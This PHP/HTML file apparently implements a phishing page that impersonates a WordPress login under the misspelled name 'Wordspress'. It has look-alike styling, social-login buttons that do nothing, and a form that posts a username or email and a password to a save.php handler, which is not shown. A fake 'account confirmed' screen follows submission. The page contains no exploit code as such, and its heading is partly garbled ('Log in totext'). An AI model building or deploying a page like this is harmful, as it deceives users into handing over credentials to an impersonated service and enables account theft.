<?php
$submitted_user = $_GET['user'] ?? '';
$is_success = isset($_GET['status']) && $_GET['status'] === 'success';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to Wordspress</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    }
    body {
      background-color: #ffffff;
      color: #333;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .header-container {
      text-align: center;
      margin-bottom: 35px;
      max-width: 600px;
    }
    h1 {
      font-family: Georgia, 'Times New Roman', Times, serif;
      font-weight: normal;
      font-size: 42px;
      color: #111;
      margin-bottom: 12px;
      letter-spacing: -0.5px;
    }
    p.subtext {
      font-size: 14px;
      color: #666;
      line-height: 1.4;
    }
    p.subtext a {
      color: #666;
      text-decoration: underline;
    }
    .main-container {
      display: flex;
      flex-direction: row;
      width: 100%;
      max-width: 720px;
      align-items: stretch;
      position: relative;
    }
    .left-section {
      flex: 1;
      padding-right: 40px;
      display: flex;
      flex-direction: column;
    }
    .divider {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      width: 1px;
      background-color: #e0e0e0;
      margin: 0 10px;
    }
    .divider-text {
      position: absolute;
      background-color: #fff;
      padding: 6px 0;
      color: #888;
      font-size: 12px;
      text-transform: uppercase;
      top: 50%;
      transform: translateY(-50%);
    }
    .right-section {
      flex: 1;
      padding-left: 40px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .form-group {
      margin-bottom: 18px;
    }
    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #222;
      margin-bottom: 6px;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px 12px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 3px;
      outline: none;
    }
    input[type="text"]:focus {
      border-color: #2b56f5;
    }
    .btn-continue {
      background-color: #3b59f8;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      font-size: 14px;
      font-weight: 500;
      border-radius: 3px;
      cursor: pointer;
      margin-top: 10px;
    }
    .btn-continue:hover {
      background-color: #2a47e7;
    }
    .social-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 10px;
      background: #fff;
      border: 1px solid #e0e0e0;
      border-radius: 3px;
      cursor: pointer;
      font-size: 13px;
      color: #333;
      position: relative;
    }
    .social-btn .icon {
      position: absolute;
      left: 20px;
      display: flex;
      align-items: center;
    }
    .footer-link {
      margin-top: 40px;
      font-size: 14px;
      text-align: center;
    }
    .footer-link a {
      color: #000;
      font-weight: 600;
      text-decoration: underline;
    }
    /* Success overlay styling */
    .success-container {
      text-align: center;
      padding: 40px 20px;
    }
    .checkmark-circle {
      width: 72px;
      height: 72px;
      background-color: #2e7d32;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px auto;
    }
    .checkmark-circle svg {
      width: 40px;
      height: 40px;
      stroke: white;
    }
    .success-title {
      font-size: 24px;
      font-weight: 600;
      color: #111;
      margin-bottom: 8px;
    }
    .success-subtitle {
      color: #666;
      font-size: 15px;
    }

    @media (max-width: 650px) {
      .main-container {
        flex-direction: column;
      }
      .left-section, .right-section {
        padding: 0;
      }
      .divider {
        width: 100%;
        height: 1px;
        margin: 25px 0;
      }
      .divider-text {
        padding: 0 10px;
        top: auto;
        transform: none;
      }
    }
  </style>
</head>
<body>

  <?php if ($is_success): ?>
    <div class="success-container">
      <div class="checkmark-circle">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="20 6 9 17 4 12"></polyline>
        </svg>
      </div>
      <div class="success-title">Thank you, <?= htmlspecialchars($submitted_user) ?>!</div>
      <div class="success-subtitle">Your account have been confirmed.</div>
      <br><br>
      <a href="index.php" style="color:#3b59f8; text-decoration:none;">&larr; Back to login</a>
    </div>
  <?php else: ?>
    <div class="header-container">
      <h1>Log in totext</h1>
      <p class="subtext">
        By continuing with any of the options below, you agree<br>
        to our <a href="#">Terms of Service</a> and have read our <a href="#">Privacy Policy</a>.
      </p>
    </div>

    <div class="main-container">
      <div class="left-section">
        <form action="save.php" method="POST">
          <div class="form-group">
            <label for="email_or_username">Email address or username</label>
            <input type="text" id="email_or_username" name="email_or_username" required>
          </div>

          <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
          </div>

          <button type="submit" class="btn-continue">Continue</button>
        </form>
      </div>

      <div class="divider">
        <span class="divider-text">OR</span>
      </div>

      <div class="right-section">
        <button class="social-btn" type="button">
          <span class="icon">
            <svg width="18" height="18" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
            </svg>
          </span>
          Google
        </button>

        <button class="social-btn" type="button">
          <span class="icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="black">
              <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.85c.66-.8 1.11-1.92.99-3.04-.96.04-2.12.64-2.8 1.44-.61.71-1.15 1.86-1.01 2.96 1.08.08 2.17-.55 2.82-1.36z"/>
            </svg>
          </span>
          Apple
        </button>

        <button class="social-btn" type="button">
          <span class="icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="black">
              <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/>
            </svg>
          </span>
          GitHub
        </button>

        <button class="social-btn" type="button">
          <span class="icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2">
              <rect x="2" y="4" width="20" height="16" rx="2"></rect>
              <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
            </svg>
          </span>
          link
        </button>

        <button class="social-btn" type="button">
          <span class="icon">
            <svg width="18" height="18" viewBox="0 0 24 24">
              <circle cx="12" cy="12" r="10" fill="#208e53"/>
              <path d="M12 6v12M8 10l4-4 4 4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </span>
          Jetpack app
        </button>
      </div>
    </div>

    <div class="footer-link">
      <a href="#">Lost your password ?</a>
    </div>
  <?php endif; ?>

</body>
</html>
